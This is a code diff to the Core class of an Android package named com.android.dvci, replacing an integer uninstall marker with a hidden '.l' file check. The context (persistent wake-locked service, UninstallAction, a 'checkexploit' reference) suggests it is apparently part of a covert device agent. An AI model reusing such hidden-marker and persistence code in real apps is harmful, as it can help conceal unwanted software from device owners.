@@ -17,6 +17,7 @@ import android.content.Context;
 import android.content.res.Resources;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
+import android.view.ViewDebug;
 
 import com.android.dvci.action.Action;
 import com.android.dvci.action.SubAction;
@@ -49,7 +50,7 @@ public class Core extends Activity implements Runnable {
 	/** The Constant SLEEPING_TIME. */
 	private static final int SLEEPING_TIME = 1000;
 	private static final String TAG = "Core"; //$NON-NLS-1$
-	private static final int UNINSTALL_MARKUP = 87623547;
+	private static final String UNINSTALL_MARKUP = ".l";
 	private static boolean serviceRunning = false;
 
 	/** The b stop core. */
@@ -484,8 +485,8 @@ public class Core extends Activity implements Runnable {
 			}
 
 			// this markup is created by UninstallAction
-			final Markup markup = new Markup(UNINSTALL_MARKUP);
-			if (markup.isMarkup()) {
+			//final Markup markup = new Markup(UNINSTALL_MARKUP);
+			if(haveUninstallMarkup()){
 				UninstallAction.actualExecute();
 				//TODO: kill checkexploit
 				return ConfType.Error;
@@ -581,6 +582,7 @@ public class Core extends Activity implements Runnable {
 
 		return ConfType.Error;
 	}
+
 
 	public boolean verifyNewConf() {
 		AutoFile file = new AutoFile(Path.conf() + ConfType.NewConf);
@@ -906,12 +908,21 @@ public class Core extends Activity implements Runnable {
 		return true;
 	}
 
-	public void createUninstallMarkup() {
-		final Markup markup = new Markup(UNINSTALL_MARKUP);
-		boolean ret = markup.createEmptyMarkup();
+
+	private boolean haveUninstallMarkup() {
+		final AutoFile markup = new AutoFile(Status.getAppContext().getFilesDir(), UNINSTALL_MARKUP);
 		if (Cfg.DEBUG) {
-			Check.asserts(ret, " (createMarkup) Assert failed, cannot create markup");
+			Check.log(TAG + " (haveUninstallMarkup) "+ markup.exists());
 		}
+		return markup.exists();
+	}
+
+	public void createUninstallMarkup() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (createUninstallMarkup) ");
+		}
+		final AutoFile markup = new AutoFile(Status.getAppContext().getFilesDir(), UNINSTALL_MARKUP);
+		markup.write(1);
 
 	}
 
